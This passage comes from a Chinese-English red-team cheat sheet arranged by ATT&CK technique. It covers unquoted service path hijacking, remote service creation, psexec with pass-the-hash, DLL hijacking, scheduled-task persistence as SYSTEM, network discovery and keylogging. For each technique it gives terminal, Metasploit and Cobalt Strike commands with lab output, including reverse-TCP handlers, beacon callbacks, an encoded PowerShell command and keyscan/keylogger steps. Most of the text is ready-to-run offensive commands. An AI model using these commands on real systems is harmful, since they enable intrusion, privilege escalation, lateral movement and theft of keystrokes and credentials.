描述:   创建全局对象
状态:   已启用


```

## Path Interception(路径劫持)

原理：

```
在服务路径权限不对或者配置错误时会被攻击者进行提权操作

Service paths (stored in Windows Registry keys) [2] and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe path with space\program.exe vs. "C:\safe path with space\program.exe"). [3] An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program. [4] [5]

服务路径(存储在Windows注册表项中)[2]和快捷方式很容易被路径拦截，如果路径有一个或多个空格，并且没有被引号包围(例如，C:\ \program.exe vs. C:\ safe path with space\program.exe)。"C:\安全路径与空格\program.exe")。对手可以将可执行文件放在路径的较高级别目录中，Windows将解析该可执行文件而不是预期的可执行文件。例如，如果快捷方式中的路径是C:\program files\myapp。竞争对手可以在C:\program.exe上创建一个程序，该程序将代替预期的程序运行

PATH Environment Variable Misconfiguration
The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\system32 (e.g., C:\Windows\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.

For example, if C:\example path precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example path will be called instead of the Windows system "net" when "net" is executed from the command-line.

```

### Check for common privilege escalation methods

#### terminal下操作（借助powershell）

> powershell -ep bypass .\powerup.ps1 Invoke-AllChecks
>
> powershell -ExecutionPolicy Bypass  .\powerup.ps1 Invoke-AllChecks

```shell
PS C:\Users\Administrator\Desktop\powrshell> powershell -ep bypass .\powerup.ps1 Invoke-AllChecks
PS C:\Users\Administrator\Desktop\powrshell> powershell -ExecutionPolicy Bypass  .\powerup.ps1 Invoke-AllChecks
PS C:\Users\Administrator\Desktop\powrshell> powershell -ExecutionPolicy Bypass -File .\powerup.ps1

```

#### msf下操作：

> exploit/windows/local/trusted_service_path

```shell
msf5 exploit(windows/local/trusted_service_path) > exploit 

[*] Started reverse TCP handler on 192.168.2.107:4444 
[*] Finding a vulnerable service...
[-] Exploit aborted due to failure: not-vulnerable: No service found with trusted path issues
[*] Exploit completed, but no session was created.

```

#### cs下操作：

> powershell-import /path/to/PowerUp.ps1
>
> powershell Invoke-AllChecks

```shell

beacon> powershell C:\Users\Administrator\Desktop\powrshell\powerup.ps1
[*] Tasked beacon to run: C:\Users\Administrator\Desktop\powrshell\powerup.ps1
[+] host called home, sent: 203 bytes
[-] could not spawn powershell -nop -exec bypass -EncodedCommand QwA6AFwAVQBzAGUAcgBzAFwAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBcAEQAZQBzAGsAdABvAHAAXABwAG8AdwByAHMAaABlAGwAbABcAHAAbwB3AGUAcgB1AHAALgBwAHMAMQA=: 2
beacon> powershell Invoke-AllChecks
[*] Tasked beacon to run: Invoke-AllChecks

```

## Service Execution(服务执行)

### Create a new service remotely（远程创建一个新服务）

#### terminal下操作

>  net use \\COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName
>
>  copy evil.exe \\COMP\ADMIN$\acachsrv.exe
>
> sc \\COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto description= "Description here" DisplayName= "DisplayName"
>
>  sc \\COMP start acachsrv

```shell
C:\Documents and Settings\Administrator>net use \\COMP\ADMIN$ "password" /user:D
OMAIN_NAME\UserName
发生系统错误 67。

找不到网络名。


C:\Documents and Settings\Administrator>copy evil.exe \\COMP\ADMIN$\System32\aca
chsrv.exe
系统找不到指定的文件。

C:\Documents and Settings\Administrator>sc \\COMP create acachsrv binPath= "C:\W
indows\System32\acachsrv.exe" start= auto  DisplayName= "DisplayName"
[SC] OpenSCManager 失败 1722:

RPC 服务器不可用。


C:\Documents and Settings\Administrator>sc \\COMP start acachsrv
[SC] OpenSCManager 失败 1722:

RPC 服务器不可用。


```

#### cs下操作：

> shell net use \\COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName
>
> shell copy evil.exe \\COMP\ADMIN$\acachsrv.exe
>
> shell sc \\COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto description= "Description here" DisplayName= "DisplayName"
>
> shell sc \\COMP start acachsrv

```shell
C:\Documents and Settings\Administrator>net use \\COMP\ADMIN$ "password" /user:D
OMAIN_NAME\UserName
发生系统错误 67。

找不到网络名。


C:\Documents and Settings\Administrator>copy evil.exe \\COMP\ADMIN$\System32\aca
chsrv.exe
系统找不到指定的文件。

C:\Documents and Settings\Administrator>sc \\COMP create acachsrv binPath= "C:\W
indows\System32\acachsrv.exe" start= auto  DisplayName= "DisplayName"
[SC] OpenSCManager 失败 1722:

RPC 服务器不可用。


C:\Documents and Settings\Administrator>sc \\COMP start acachsrv
[SC] OpenSCManager 失败 1722:

RPC 服务器不可用。


```

### Create a new service remotely (using psexec)(使用psexec创建新的远程服务)

原理：

```shell

psexec copies over a file to the remote box via SMB, then creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, then deletes the service.

使用psexec通过smb复制文件，然后创建一个指向刚刚复制过来的二进制文件的随机名的服务，然后启动、删除服务

```

#### terminal下操作：

> psexec /accepteula \\ip -u domain\user -p password -c -f \\smbip\share\file.exe (Copy and execute file.exe on the remote system)
>
> psexec /accepteula \\ip -u domain\user -p  lm:ntlm cmd.exe /c dir c:\Progra~1 (Run cmd.exe on the remote system using the lm:ntlm password hash - aka pass the hash)
>
> psexec /accepteula \\ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)

#### msf下操作：

> exploit/windows/smb/psexec
>
> exploit/windows/local/current_user_psexec
>
> auxiliary/admin/smb/psexec_command
>
> auxiliary/scanner/smb/psexec_loggedin_users
>
> exploit/windows/smb/psexec_psh


```shell
msf5 exploit(multi/handler) > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > show options 

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target address range or CIDR identifier
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec) > set rhosts 192.168.2.103
rhosts => 192.168.2.103
msf5 exploit(windows/smb/psexec) > exploit 

[-] Handler failed to bind to 192.168.2.103:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] 192.168.2.103:445 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.

msf5 exploit(windows/smb/psexec) > use exploit/windows/local/current_user_psexec 
msf5 exploit(windows/local/current_user_psexec) > show options 

Module options (exploit/windows/local/current_user_psexec):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DISPNAME                           no        Service display name (Default: random)
   INTERNAL_ADDRESS                   no        Session's internal address or hostname for the victims to grab the payload from (Default: detected)
   KERBEROS          false            yes       Authenticate via Kerberos, dont resolve hostnames
   NAME                               no        Service name on each target in RHOSTS (Default: random)
   RHOSTS                             no        Target address range or CIDR identifier
   SESSION                            yes       The session to run this module on.
   TECHNIQUE         PSH              yes       Technique to use (Accepted: PSH, SMB)


Exploit target:

   Id  Name
   --  ----
   0   Universal


msf5 exploit(windows/local/current_user_psexec) > set session 1
session => 1
msf5 exploit(windows/local/current_user_psexec) > exploit 

msf5 exploit(windows/local/current_user_psexec) > use auxiliary/admin/smb/psexec_command 
msf5 auxiliary(admin/smb/psexec_command) > show options 

Module options (auxiliary/admin/smb/psexec_command):

   Name                  Current Setting                    Required  Description
   ----                  ---------------                    --------  -----------
   COMMAND               net group "Domain Admins" /domain  yes       The command you want to execute on the remote host
   RHOSTS                                                   yes       The target address range or CIDR identifier
   RPORT                 445                                yes       The Target port
   SERVICE_DESCRIPTION                                      no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                     no        The service display name
   SERVICE_NAME                                             no        The service name
   SMBDomain             .                                  no        The Windows domain to use for authentication
   SMBPass                                                  no        The password for the specified username
   SMBSHARE              C$                                 yes       The name of a writeable share on the server
   SMBUser                                                  no        The username to authenticate as
   THREADS               1                                  yes       The number of concurrent threads
   WINPATH               WINDOWS                            yes       The name of the remote Windows directory

msf5 auxiliary(admin/smb/psexec_command) > set rhosts 192.168.2.103
rhosts => 192.168.2.103
msf5 auxiliary(admin/smb/psexec_command) > exploit 

[*] 192.168.2.103:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(admin/smb/psexec_command) > use auxiliary/scanner/smb/psexec_loggedin_users 
msf5 auxiliary(scanner/smb/psexec_loggedin_users) > show options 

Module options (auxiliary/scanner/smb/psexec_loggedin_users):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target address range or CIDR identifier
   RPORT                 445              yes       The Target port
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE              C$               yes       The name of a writeable share on the server
   SMBUser                                no        The username to authenticate as
   THREADS               1                yes       The number of concurrent threads
   USERNAME                               no        The name of a specific user to search for
   WINPATH               WINDOWS          yes       The name of the Windows directory

msf5 auxiliary(scanner/smb/psexec_loggedin_users) > set rhosts 192.168.2.103
rhosts => 192.168.2.103
msf5 auxiliary(scanner/smb/psexec_loggedin_users) > exploit 

[-] 192.168.2.103:445     - The connection was refused by the remote host (192.168.2.103:445).
[*] 192.168.2.103:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/smb/psexec_loggedin_users) > use exploit/windows/smb/psexec_psh 
msf5 exploit(windows/smb/psexec_psh) > show options 

Module options (exploit/windows/smb/psexec_psh):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   DryRun                false            no        Prints the powershell command that would be used
   RHOSTS                                 yes       The target address range or CIDR identifier
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec_psh) > set rhosts 192.168.2.103
rhosts => 192.168.2.103
msf5 exploit(windows/smb/psexec_psh) > exploit 

```

#### cs下操作：

> psexec COMP_NAME {listener name} (via sc)
>
> psexec_sh COMP_NAME {listener name} (via powershell)

## DLL Search Order Hijacking（DLL劫持）

原理：

```shell
Windows systems use a common method to look for required DLLs to load into a program. [1] Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence.

Adversaries may perform DLL preloading, also called binary planting attacks, [2] by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. [3] Adversaries may use this behavior to cause the program to load a malicious DLL.

Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. [4] [5] [6]

If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.

Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.

通俗的来理解就是windows下的dll文件可以被替换或可以修改.manifest或.local重定向文件、目录或连接来直接修改程序加载DLL来达到权限提升或者其他的效果。
```

### Check for common privilege escalation methods（常见的提权方法检测）

#### terminal下操作：

> powershell.exe -epbypass PowerUp.ps1
Invoke-AllChecks

```shell

PS C:\Users\Administrator\Desktop\powrshell> powershell -ExecutionPolicy Bypass  .\powerup.ps1 Invoke-AllChecks

```

#### msf下操作：

> exploit/windows/local/trusted_service_path

```shell
msf5 exploit(windows/local/trusted_service_path) > show options 

Module options (exploit/windows/local/trusted_service_path):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf5 exploit(windows/local/trusted_service_path) > set session 1
session => 1
msf5 exploit(windows/local/trusted_service_path) > exploit 

[-] Handler failed to bind to 192.168.2.103:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] Finding a vulnerable service...
[-] Exploit aborted due to failure: not-vulnerable: No service found with trusted path issues
[*] Exploit completed, but no session was created.

```

#### cs下操作：

> powershell-import /path/to/PowerUp.ps1
>
> powershell Invoke-AllChecks


## File System Permissions Weakness(文件系统权限不足)

原理：

```
Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

Services
Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.

Executable Installers
Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors. [1] [2]

简单来说就是可以替换文件、服务或者使用安装文件来获取权限

```

### Check for common privilege escalation methods（常见的提权方法检测）

#### terminal下操作：

> powershell.exe -epbypass PowerUp.ps1
>
> Invoke-AllChecks

```shell
PS C:\Users\Administrator\Desktop\powrshell> Invoke-AllChecks

[*] Running Invoke-AllChecks
[+] Current user already has local administrative privileges!


[*] Checking for unquoted service paths...


ServiceName    : VOneMgrSvcForNG
Path           : C:\Program Files (x86)\NGVONE\Client\sv_service.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=AppendData/AddSu
                 bdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'VOneMgrSvcForNG' -Path <HijackPath>
CanRestart     : True

ServiceName    : VOneMgrSvcForNG
Path           : C:\Program Files (x86)\NGVONE\Client\sv_service.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'VOneMgrSvcForNG' -Path <HijackPath>
CanRestart     : True

ServiceName    : VOneMgrSvcForNG
Path           : C:\Program Files (x86)\NGVONE\Client\sv_service.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Administrators; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'VOneMgrSvcForNG' -Path <HijackPath>
CanRestart     : True


```

#### msf下操作：

> exploit/windows/local/trusted_service_path

```shell
msf5 exploit(windows/local/trusted_service_path) > exploit 

[*] Started reverse TCP handler on 192.168.2.103:4444 
[*] Finding a vulnerable service...
[-] Exploit aborted due to failure: not-vulnerable: No service found with trusted path issues
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/trusted_service_path) > 

```

## System Network Connections Discovery(系统网络连接发现)

### Get current TCP/IP connections（获取当前TCP/IP连接）

#### terminal下操作：

> netstat -ano

```shell
PS C:\Users\Administrator\Desktop\powrshell> netstat -ano

活动连接

  协议  本地地址          外部地址        状态           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       860
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:515            0.0.0.0:0              LISTENING       2988
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       376
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       64
  TCP    0.0.0.0:7443           0.0.0.0:0              LISTENING       5712
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       496
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1248
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1136
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2028
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2612
  TCP    0.0.0.0:49672          0.0.0.0:0              LISTENING       604
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       2784
  TCP    0.0.0.0:49683          0.0.0.0:0              LISTENING       632
  TCP    127.0.0.1:3443         0.0.0.0:0              LISTENING       3416
  TCP    127.0.0.1:35432        0.0.0.0:0              LISTENING       3456
  TCP    127.0.0.1:49677        127.0.0.1:49678        ESTABLISHED     3416
  TCP    127.0.0.1:49678        127.0.0.1:49677        ESTABLISHED     3416
  TCP    192.168.97.132:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.97.132:50215   40.90.189.152:443      ESTABLISHED     2740
  TCP    192.168.97.132:50231   185.199.109.153:443    TIME_WAIT       0
  TCP    192.168.97.132:50232   172.217.25.13:443      TIME_WAIT       0
  TCP    192.168.97.132:50233   203.208.39.227:443     TIME_WAIT       0
  TCP    192.168.97.132:50235   203.208.50.94:443      TIME_WAIT       0
  TCP    192.168.97.132:50236   216.58.197.99:443      TIME_WAIT       0
  TCP    192.168.97.132:50237   203.208.39.227:80      TIME_WAIT       0
  TCP    192.168.97.132:50238   216.117.2.180:443      TIME_WAIT       0
  TCP    192.168.97.132:50241   203.208.43.77:443      TIME_WAIT       0
  TCP    192.168.97.132:50242   203.208.40.62:443      TIME_WAIT       0
  TCP    192.168.97.132:50244   3.224.99.7:443         TIME_WAIT       0
  TCP    192.168.97.132:50246   172.217.31.234:443     TIME_WAIT       0
  TCP    192.168.97.132:50247   54.186.190.8:443       TIME_WAIT       0
  TCP    192.168.97.132:50248   3.213.73.75:443        TIME_WAIT       0
  TCP    192.168.97.132:50249   216.117.2.180:443      TIME_WAIT       0
  TCP    192.168.97.132:50250   216.117.2.180:443      TIME_WAIT       0
  TCP    192.168.97.132:50251   216.117.2.180:443      TIME_WAIT       0
  TCP    192.168.97.132:50252   123.129.254.12:80      TIME_WAIT       0
  TCP    192.168.97.132:50253   123.129.254.12:80      TIME_WAIT       0
  TCP    192.168.97.132:50256   216.58.221.238:443     TIME_WAIT       0
  TCP    192.168.97.132:50257   52.139.250.253:443     ESTABLISHED     2740
  TCP    [::]:135               [::]:0                 LISTENING       860
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:515               [::]:0                 LISTENING       2988
  TCP    [::]:3389              [::]:0                 LISTENING       376
  TCP    [::]:49664             [::]:0                 LISTENING       496
  TCP    [::]:49665             [::]:0                 LISTENING       1248
  TCP    [::]:49666             [::]:0                 LISTENING       1136
  TCP    [::]:49667             [::]:0                 LISTENING       2028
  TCP    [::]:49668             [::]:0                 LISTENING       2612
  TCP    [::]:49672             [::]:0                 LISTENING       604
  TCP    [::]:49673             [::]:0                 LISTENING       2784
  TCP    [::]:49683             [::]:0                 LISTENING       632
  TCP    [::1]:35432            [::]:0                 LISTENING       3456
  TCP    [::1]:35432            [::1]:50211            ESTABLISHED     3456
  TCP    [::1]:35432            [::1]:50212            ESTABLISHED     3456
  TCP    [::1]:35432            [::1]:50213            ESTABLISHED     3456
  TCP    [::1]:35432            [::1]:50214            ESTABLISHED     3456
  TCP    [::1]:50211            [::1]:35432            ESTABLISHED     3416
  TCP    [::1]:50212            [::1]:35432            ESTABLISHED     3416
  TCP    [::1]:50213            [::1]:35432            ESTABLISHED     3416
  TCP    [::1]:50214            [::1]:35432            ESTABLISHED     3416
  UDP    0.0.0.0:500            *:*                                    2772
  UDP    0.0.0.0:3389           *:*                                    376
  UDP    0.0.0.0:4500           *:*                                    2772
  UDP    0.0.0.0:5050           *:*                                    64
  UDP    0.0.0.0:5353           *:*                                    2204
  UDP    0.0.0.0:5355           *:*                                    2204
  UDP    0.0.0.0:58658          *:*                                    5712
  UDP    127.0.0.1:1900         *:*                                    2268
  UDP    127.0.0.1:4499         *:*                                    236
  UDP    127.0.0.1:58657        *:*                                    5712
  UDP    127.0.0.1:62902        *:*                                    2268
  UDP    127.0.0.1:63142        *:*                                    3260
  UDP    192.168.97.132:137     *:*                                    4
  UDP    192.168.97.132:138     *:*                                    4
  UDP    192.168.97.132:1900    *:*                                    2268
  UDP    192.168.97.132:62901   *:*                                    2268
  UDP    [::]:500               *:*                                    2772
  UDP    [::]:3389              *:*                                    376
  UDP    [::]:4500              *:*                                    2772
  UDP    [::]:5353              *:*                                    2204
  UDP    [::]:5355              *:*                                    2204
  UDP    [::1]:1900             *:*                                    2268
  UDP    [::1]:62900            *:*                                    2268
  UDP    [::1]:63143            *:*                                    3456
  UDP    [fe80::bc99:52b6:7f3b:cdb8%11]:1900  *:*                                    2268
  UDP    [fe80::bc99:52b6:7f3b:cdb8%11]:62899  *:*                                    2268
```
#### msf下操作：

> /post/windows/gather/tcpnetstat

```shell
msf5 exploit(windows/local/trusted_service_path) > use post/windows/gather/tcpnetstat
msf5 post(windows/gather/tcpnetstat) > show options 

Module options (post/windows/gather/tcpnetstat):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(windows/gather/tcpnetstat) > set session 1
session => 1
msf5 post(windows/gather/tcpnetstat) > exploit 

[*] TCP Table Size: 472
[*] Total TCP Entries: 13
[*] Connection Table
================

  STATE        LHOST          LPORT  RHOST          RPORT
  -----        -----          -----  -----          -----
  ESTABLISHED  192.168.2.114  1068   192.168.2.103  5555
  LISTEN       0.0.0.0        80     0.0.0.0        _
  LISTEN       0.0.0.0        135    0.0.0.0        _
  LISTEN       0.0.0.0        445    0.0.0.0        _
  LISTEN       0.0.0.0        1025   0.0.0.0        _
  LISTEN       0.0.0.0        1026   0.0.0.0        _
  LISTEN       0.0.0.0        1035   0.0.0.0        _
  LISTEN       0.0.0.0        1801   0.0.0.0        _
  LISTEN       0.0.0.0        2103   0.0.0.0        _
  LISTEN       0.0.0.0        2105   0.0.0.0        _
  LISTEN       0.0.0.0        2107   0.0.0.0        _
  LISTEN       0.0.0.0        3306   0.0.0.0        _
  LISTEN       192.168.2.114  139    0.0.0.0        _

[*] Post module execution completed

```

####　ｃs下操作：

> shell c:\windows\sysnative\netstat.exe -ano

```
beacon> shell c:\windows\system32\netstat.exe -ano
[*] Tasked beacon to run: c:\windows\system32\netstat.exe -ano
[+] host called home, sent: 67 bytes
[+] received output:

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1100
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       688
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       400
  TCP    0.0.0.0:1026           0.0.0.0:0              LISTENING       984
  TCP    0.0.0.0:1035           0.0.0.0:0              LISTENING       1932
  TCP    0.0.0.0:1801           0.0.0.0:0              LISTENING       1932
  TCP    0.0.0.0:2103           0.0.0.0:0              LISTENING       1932
  TCP    0.0.0.0:2105           0.0.0.0:0              LISTENING       1932
  TCP    0.0.0.0:2107           0.0.0.0:0              LISTENING       1932
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1252
  TCP    192.168.2.114:139      0.0.0.0:0              LISTENING       4
  TCP    192.168.2.114:1068     192.168.2.103:5555     ESTABLISHED     572
  TCP    192.168.2.114:1530     192.168.2.105:139      TIME_WAIT       0
  TCP    192.168.2.114:1531     192.168.2.105:139      TIME_WAIT       0
  TCP    192.168.2.114:1532     120.41.45.100:80       TIME_WAIT       0
  UDP    0.0.0.0:445            *:*                                    4
  UDP    0.0.0.0:500            *:*                                    400
  UDP    0.0.0.0:1027           *:*                                    748
  UDP    0.0.0.0:1034           *:*                                    1932
  UDP    0.0.0.0:3527           *:*                                    1932
  UDP    0.0.0.0:4500           *:*                                    400
  UDP    127.0.0.1:123          *:*                                    800
  UDP    192.168.2.114:123      *:*                                    800
  UDP    192.168.2.114:137      *:*                                    4
  UDP    192.168.2.114:138      *:*                                    4



```

### Display active SMB sessions(显示活动的smb会话)

#### terminal下操作：

> net session | find / "\\"

```
PS C:\Users\Administrator\Desktop\powrshell> net session | find / "\\"
FIND: 无效的开关
```

#### msf下操作：

> post/windows/gather/enum_logged_on_users

```shell
msf5 post(windows/gather/tcpnetstat) > use post/windows/gather/enum_logged_on_users
msf5 post(windows/gather/enum_logged_on_users) > show options 

Module options (post/windows/gather/enum_logged_on_users):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently logged on users
   RECENT   true             yes       Enumerate Recently logged on users
   SESSION                   yes       The session to run this module on.

msf5 post(windows/gather/enum_logged_on_users) > set session 1
session => 1
msf5 post(windows/gather/enum_logged_on_users) > exploit 

[*] Running against session 1

Current Logged Users
====================

 SID                                            User
 ---                                            ----
 S-1-5-21-1911985068-4225083820-4011728908-500  ROOT-5DE52AC98B\Administrator


[+] Results saved in: /root/.msf4/loot/20190907124429_default_192.168.2.114_host.users.activ_626805.txt

Recently Logged Users
=====================

 SID                                            Profile Path
 ---                                            ------------
 S-1-5-18                                       %systemroot%\system32\config\systemprofile
 S-1-5-19                                       %SystemDrive%\Documents and Settings\LocalService
 S-1-5-20                                       %SystemDrive%\Documents and Settings\NetworkService
 S-1-5-21-1911985068-4225083820-4011728908-500  %SystemDrive%\Documents and Settings\Administrator


[*] Post module execution completed

```

#### cs下操作：

> shell net session | find / "\\"

```
beacon> shell net session | find / "\\"
[*] Tasked beacon to run: net session | find / "\\"

```

## Scheduled Task(计划任务)

原理：

```
Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. [1]

An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

主要就是使用at或者sc命令去启动一个程序，不过需要满足使用RPC的适当身份验证
```

### Display all currently scheduled tasks（显示所有的计划任务）

#### terminal下操作：

> schtasks [/s HOSTNAME]

```
PS C:\Users\Administrator\Desktop\powrshell> schtasks

文件夹: \
任务名                                   下次运行时间           模式
======================================== ====================== ===============
信息: 目前在你的访问级别上不存在任何可用的计划任务。

文件夹: \Microsoft
任务名                                   下次运行时间           模式
======================================== ====================== ===============
信息: 目前在你的访问级别上不存在任何可用的计划任务。

文件夹: \Microsoft\Windows
任务名                                   下次运行时间           模式
======================================== ====================== ===============
信息: 目前在你的访问级别上不存在任何可用的计划任务。

文件夹: \Microsoft\Windows\.NET Framework

```

#### cs下操作：

> shell schtasks

```shell
beacon> shell schtasks
[*] Tasked beacon to run: schtasks
[+] host called home, sent: 39 bytes
[+] received output:
信息: 系统里没有计划任务。

```

### Create a scheduled task(创建一个计划任务)

#### terminal下操作：

```
schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
net start schedule
sc config schedule start= auto
```
```shell
PS C:\Users\Administrator\Desktop\powrshell> net start schedule
请求的服务已经启动。

请键入 NET HELPMSG 2182 以获得更多的帮助。

PS C:\Users\Administrator\Desktop\powrshell> schtasks /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru
"System"

成功: 成功创建计划任务 "acachesrv"。

```

#### cs下操作：

```
shell schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
shell net start schedule
shell sc config schedule start= auto
```

## Input Capture（输入捕捉（键盘记录））

### Start a keylogger（开始键盘记录）

#### msf下操作：

> starting the keylogger:
>
> keyscan_start
>
> when you're ready to get the logs:
>
> keyscan_dump
>
> when you're done keylogging:
>
> keyscan_stop

```shell
meterpreter > keyscan_start 
Starting the keystroke sniffer ...
meterpreter > keyscan_dump 
Dumping captured keystrokes...
1513215212

meterpreter > keyscan_stop 
Stopping the keystroke sniffer...

```
#### cs下操作：

> keylogger 1320 x86(进程名、系统版本)

```
beacon> keylogger 1200 x86
